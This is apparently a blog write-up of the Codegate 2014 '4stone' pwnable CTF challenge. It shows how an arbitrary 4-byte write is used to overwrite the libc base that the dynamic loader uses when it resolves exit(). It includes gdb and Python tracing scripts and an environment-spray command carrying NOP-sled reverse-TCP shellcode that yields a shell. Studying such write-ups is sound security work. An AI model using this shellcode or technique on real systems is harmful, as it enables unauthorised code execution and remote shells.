+++
author = "pwntester"
categories = ["pwnable", "ctf", "codegate", "loader"]
date = 2014-03-23T11:38:00Z
description = ""
draft = false
slug = "codegate-2k14-4stone-pwnable-300-write-up"
tags = ["pwnable", "ctf", "codegate", "loader"]
title = "Codegate 2k14 4stone (Pwnable 300) Write Up"

+++


In this level we are presented with a connect 4 game written with ncurses. After playing a couple of times we find a combination to win: `DHHDLLDHDDDLDD`

![](/images/octopress/4stone-6.png)
![](/images/octopress/4stone-4.png)

Nothing happens though so lets fire up Hopper and take a look at the code. A good place to start is by analyzing the code around the **you win** and **you lose** exit strings and actually, after priting the **you win** string we can find an interesting piece of code before the call to `exit()`

![](/images/octopress/4stone-7.png)

If we decompile we can easily read what the code is doing:

![](/images/octopress/4stone-5.png)

If we win in 0 seconds, and the number or arguments passed to the program is 2 (the program and a first argument), then the first argument is converted into an unsigned long and with gdb we can see that `scanf("%x", 0xbffffab8)` is called, so we are writing whatever hexadecimal value we receive in **stdin** as an unsigned integer(4 bytes) in the stack. Then the program checks if the value read starts with `0x0804xxxx` or `0xbxxxxxxx` and if thats not the case, the value read from the first argument is stored in the address got from the **stdin**. So basically we have a 4 bytes write to any *arbitrary* address not starting with those prefixes.

Lets check it. First we need to prepare a file with the combo needed to win in 0 seconds and the value we want to write in memory:

![](/images/octopress/4stone-8.png)

Now we need to run the program with an argument pointing to an address outside the restricted areas. If we look into the process memory mapping, we see that only a tiny portion of the heap is outside those addresses:

![](/images/octopress/4stone-9.png)

We can increase it by augmenting the stack area running `ulimit -s unlimited` effectively disabling ASLR:

![](/images/octopress/4stone-10.png)

Much better, now the only protected memory area are the stack and the binary. Too bad we cannot overwrite `exit@GOT since its going to be called right after the arbitrary 4 bytes write.

For now we are going to write `0x41414141` in `0x4001f000` that has write permissions to verify the vulnerability.

```lang-bash line-numbers 
Breakpoint 2, 0x080498ac in ?? ()
=> 0x080498ac:  89 10   mov    DWORD PTR [eax],edx
gdb-peda$ i r eax edx
eax            0x4001f000       0x4001f000
edx            0x41414141       0x41414141
gdb-peda$ n
gdb-peda$ x/x $eax
0x4001f000:     0x41414141
```

Pretty cool!! but useless ... so where and what to write??? The only code left to run is the call to `exit()` so we need a way to hijack that call and we cannot write to the `GOT`. Lets review what is going to happen when we reach the call to `exit()` and lets try to find a place to redirect the execution flow:

* The program calls `exit()` and jumps to `PLT`
* `PLT` jumps to the `GOT` but since the address has not being resolved yet, we jump to the dynamic loader to locate the address of `exit()` in libc and write the address to the `GOT` so we can effectively jump to the `exit()` code.

In order to calculate the `exit()` address, the dynamic loader will check `libc` address and the offset of `exit()` in libc. If we can influence either the **base** or the **offset** we will be able to redirect the original call to any arbitrary location. If we are going to debug the dynamic loader, we better get ourselves some symbols.

[We will need](http://dynofu.wikispaces.com/Tracing+Shared+Library+Call+Translation):

* libc debug symbol: sudo apt-get install libc-dbg
* libc6 source: sudo apt-get source libc6*

Don't know why but symbols for the loader need to be manually loaded. Adjust the `ld-linux` address and add these lines to a `gdb` script:

```lang-bash line-numbers 
show auto-solib-add
add-symbol-file /usr/lib/debug/lib/i386-linux-gnu/ld-2.13.so 0x40000820
directory /mnt/hgfs/Desktop/Codegate2k14/4stone/eglibc-2.13/elf
sharedlibrary
info sharedlibrary
```

Run gdb and check that `ld` symbols are loaded

![](/images/octopress/4stone-11.png)

We want to find out where the libc address or `exit` offset are stored so we can recognize them while tracing the loader resolution. These are the values we are looking for:

![](/images/octopress/4stone-19.png)

Ok, lets start the tracing. The first instruction in `ld-linux` is:

![](/images/octopress/4stone-14.png)

And look that, we even have comments!! ;) Ok, the `_dl_runtime_resolve` funcion doesn't look too scary:

![](/images/octopress/4stone-15.png)

`_dl_fixup` is a different thing, but it has few calls and the second one to `_dl_lookup_symbol_x` looks promising.

![](/images/octopress/4stone-16.png)

As seen in the screenshot, right after the call `EAX` is updated with `0x40082000` which contains `0x40083000` the libc base address we were looking for. And if you go up to the process memory mapping, you will see that that address is writable!

In this case we were lucky, the `libc` address pop up quite early, but I wrote this script to automate the task in case I had to trace deep in the loader guts:

```lang-python line-numbers 
import gdb
import time

gdb.execute("set python print-stack full", False, True)
gdb.execute("set height 0", False)
gdb.execute("show auto-solib-add", False)
gdb.execute("add-symbol-file /usr/lib/debug/lib/i386-linux-gnu/ld-2.13.so 0x40000820", False)
gdb.execute("directory /mnt/hgfs/Desktop/Codegate2k14/4stone/eglibc-2.13/elf", False)
gdb.execute("sharedlibrary", False)

# Set bp at 'call   0x8048710 <_exit@plt>'
gdb.execute("break *0x%x" % 0x80498b5, False)

libc = "40083000"
# Run binary
gdb.execute("r 4001f000 < combo", False, True)
start_time = time.time()
print "[+] Tracing ... "
print "[+] Looking for libc base address (0x40083000) ... "

while True:
    try:
        output = gdb.execute("context register", False, True)
        if libc in output:
            print output
            print("[+] Found in: {0} seconds".format(str(time.time() - start_time)))
            break
        gdb.execute("si", False, True)
    except gdb.error as detail:
        if str(detail) == "The program is not being run.":
            break
        print str(detail)
```

Running the tracer, we can quickly find the address where the libc base is stored:

![](/images/octopress/4stone-20.png)

OK, So `exit@GOT` is going to be updated with `libc_base + exit_offset`; we now control `libc` base, and we know the offset so if we want to redirect the execution flow, lets say that to `0x41414141` we have to overwrite the `libc` base address with `0x41414141 - 0xa1354 = 0x41372ded`. Let's try it, we will update the combo file with this value (so it is sent to the program via stdin) and call the executable with `0x40082000` as argument.

![](/images/octopress/4stone-17.png)

Sweet, we now control `EIP`!! But where should we jump?? We dont control any area in the stack and we cannot pass more arguments to the program, so the only thing we can do is a Environment variable Spray with a large NOP sled and a shellcode and then jump to a high address (`0xbff00000 + 0xa1354`) of the stack hoping to land in the NOP sled.

Shellcode: reverse TCP connection to port 4444 on local machine:

![](/images/octopress/4stone-3.png)

Environment Spray:

```lang-bash line-numbers 
for i in $(seq 1 1024); do export payload$i="`python -c "print '\x90'*2048+'\xbf\xdd\xc9\xc5\xd6\xd9\xc5\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x12\x83\xc0\x04\x31\x78\x0e\x03\xa5\xc7\x27\x23\x64\x03\x50\x2f\xd5\xf0\xcc\xda\xdb\x7f\x13\xaa\xbd\xb2\x54\x58\x18\xfd\x6a\x92\x1a\xb4\xed\xd5\x72\x38\x0e\x26\x83\xae\x0c\x26\x92\x72\x98\xc7\x24\xec\xca\x56\x17\x42\xe9\xd1\x76\x69\x6e\xb3\x10\x5d\x40\x47\x88\xc9\xb1\xc5\x21\x64\x47\xea\xe3\x2b\xde\x0c\xb3\xc7\x2d\x4e'"`"; done
```

Failed attempt:

![](/images/octopress/4stone-1.png)

aaaaand we got our shell:

![](/images/octopress/4stone-2.png)

Voila!!



